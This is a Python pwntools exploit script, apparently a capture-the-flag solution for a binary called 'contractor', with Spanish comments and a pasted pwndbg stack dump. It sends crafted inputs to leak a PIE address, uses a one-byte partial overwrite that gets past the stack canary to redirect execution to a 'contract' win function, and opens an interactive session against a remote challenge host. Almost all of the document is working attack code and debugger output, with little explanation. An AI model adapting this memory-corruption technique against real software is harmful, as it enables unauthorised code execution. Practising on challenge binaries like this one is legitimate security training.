from pwn import *

#x/128gx 0x7fffffffde98-32-32-32-32-32
#b *main+1580
#b *main+1666
#b *read_num
gs = '''
b *main+1580
b *main+1666
continue
'''

elf = context.binary = ELF("./contractor")

def start():
    if args.REMOTE:
        return remote("94.237.54.21", 54620)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("> ", b"A"*0x5)

io.sendafter("> ", b"A"*0x100)

io.sendlineafter("> ", b"32345245354")

io.sendafter("> ", b"B"*0x10)

io.recvuntil("[Specialty]: BBBBBBBBBBBBBBBB")

leak_pie = u64(io.recv(7).strip().ljust(8, b"\x00"))

elf.address = leak_pie - elf.sym.__libc_csu_init

print(f"Win Function: {hex(elf.sym.contract)}")

io.sendlineafter("> ", b"4")
io.sendafter("at: ", b"D"*32 + b"\x8f") # Para ese address del stack fuera del canary ojo

io.sendline(p64(elf.sym.contract + 25))

"""
io.sendlineafter("> ", b"1")
io.sendafter("again: ", b"C"*0x10)
"""

"""

# Para 2 - Reason
io.sendlineafter("> ", b"2")

io.sendafter("please: ", b"C"*0x100)

io.sendafter("> ", b"D"*4)
"""

# Nota: Esta cosa puede que requiera ser varias veces ejecutada para tener exito xD
io.interactive()

"""
Estado normal del stack luego del leak:
pwndbg> x/128gx 0x7fffffffde98-32-32-32-32-32-32-32-32-32-8
0x7fffffffdd70:	0x4141414141414141	0x4141414141414141
0x7fffffffdd80:	0x4141414141414141	0x4141414141414141
0x7fffffffdd90:	0x4141414141414141	0x4141414141414141
0x7fffffffdda0:	0x4141414141414141	0x4141414141414141
0x7fffffffddb0:	0x4141414141414141	0x4141414141414141
0x7fffffffddc0:	0x4141414141414141	0x4141414141414141
0x7fffffffddd0:	0x4141414141414141	0x4141414141414141
0x7fffffffdde0:	0x4141414141414141	0x4141414141414141
0x7fffffffddf0:	0x4141414141414141	0x4141414141414141
0x7fffffffde00:	0x4141414141414141	0x4141414141414141
0x7fffffffde10:	0x4141414141414141	0x4141414141414141
0x7fffffffde20:	0x4141414141414141	0x4141414141414141
0x7fffffffde30:	0x4141414141414141	0x4141414141414141
0x7fffffffde40:	0x4141414141414141	0x4141414141414141
0x7fffffffde50:	0x4141414141414141	0x4141414141414141
0x7fffffffde60:	0x4141414141414141	0x4141414141414141
0x7fffffffde70:	0x4141414141414141	0x4141414141414141
0x7fffffffde80:	0x7fffffff000004d2	0x4242424242424242
0x7fffffffde90:	0x4242424242424242	0x0000555555555b50
0x7fffffffdea0:	0x0000000200000003	0x00007fffffffdd70
0x7fffffffdeb0:	0x43434343ffffdfb0*	0x80d8c36147843000



Ahora el pequeño bit a escribir, influira de esta forma


0x7fffffffde90:	0x4444444444444444	0x4444444444444444
0x7fffffffdea0:	0x4444444544444444	0x00007fffffffddc8
0x7fffffffdeb0:	0x00007fffffffdfb0	0x01407412ab665500
0x7fffffffdec0:	0x0000000000000000	0x00007ffff7df9083
0x7fffffffded0:	0x00007ffff7ffc620	0x00007fffffffdfb8
0x7fffffffdee0:	0x0000000100000000	0x0000555555555441
0x7fffffffdef0:	0x0000555555555b50	0xc6afd51ebd9824c2 *canary
0x7fffffffdf00*:	0x41414141414141a0	0x4141414141414141
0x7fffffffdf10:	0x4141414141414141	0x4141414141414141

*: es donde empieza la segunda escritura
"""